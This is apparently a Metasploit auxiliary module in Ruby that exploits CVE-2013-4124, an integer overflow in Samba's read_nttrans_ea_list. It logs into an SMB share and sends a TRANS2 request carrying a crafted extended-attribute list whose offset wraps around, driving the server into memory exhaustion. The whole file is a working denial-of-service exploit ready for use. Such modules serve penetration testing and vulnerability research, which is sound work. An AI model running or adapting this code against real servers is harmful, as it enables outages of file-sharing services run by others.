##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/struct2'
require 'rex/proto/smb'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB

	UTILS = Rex::Proto::SMB::Utils

	# Trans2_Parameters
	TRANS2_PARAM = Rex::Struct2::CStructTemplate.new(
		[ 'uint16v', 'FID', 0 ], # SMB_FILE_FULL_EA_INFORMATION
		[ 'uint16v', 'InfoLevel', 1015 ], # SMB_FILE_FULL_EA_INFORMATION
		[ 'uint16v', 'Reserved', 0x00 ],
	)

	FEA_LIST = Rex::Struct2::CStructTemplate.new(
		[ 'uint32v', 'NextOffset', 0x00000000],
		[ 'uint8', 'Flags', 0x00 ],
		[ 'uint8', 'NameLen', 0x07 ], # length of Name parameter minus trailing newline
		[ 'uint16v', 'ValueLen', 0x04 ], #random valuelen with value
		[ 'string', 'Name', 7, "dzlnly\x00" ], # Random string must end with '\0'
		[ 'string', 'Value', 4, "\x00\x00\x00\x00" ]
	)

	def initialize(info = {})
		super(update_info(info,
			'Name'	   => 'Samba read_nttrans_ea_list Integer Overflow',
			'Description'    => %q{
				Integer overflow in the read_nttrans_ea_list function in nttrans.c
				in smbd in Samba 3.x before 3.5.22, 3.6.x before 3.6.17, and 4.x
				before 4.0.8 allows remote attackers to cause a denial of service
				(memory consumption) via a malformed packet.
				Note: "ea support" option on share must be enabled
			},
			'Author'	 =>
				[ 'dz_lnly', ],
			'License'	=> MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-4124'],
				],
			))

		register_options(
			[
				Opt::RHOST(),
				Opt::RPORT(445),
				OptString.new('SMBShare', [true, 'Target share', '']),
			], self.class)

	end

	def get_fid
		print_status("Try to find any files or directories for setting our attributes...")
		files = self.simple.client.find_first("*")
		path = ""
		ok = self.simple.client.create(path)
		return ok['Payload'].v['FileID']
	end
	def mk_items_payload
		item1 = FEA_LIST.make_struct
		ilen = item1.to_s.length
		item1.v['NextOffset'] = ilen
		item2 = FEA_LIST.make_struct
		# Wrap offset to 0x00
		item2.v['NextOffset'] = 0xffffffff - ilen + 1
		item3 = FEA_LIST.make_struct #Some padding
		return item1.to_s + item2.to_s + item3.to_s
	end
	def send_pkt
		fid = get_fid

		trans = TRANS2_PARAM.make_struct
		trans.v['FID'] = fid
		data = mk_items_payload
		subcmd = 0x08
		self.simple.client.trans2(subcmd, trans.to_s, data.to_s, false)
	end
	def run
		connect()
		smb_login()
		self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")

		print_status('Sending malicious package...')
		send_pkt
		print_status('Seems like all ok')

		disconnect()
	end
end
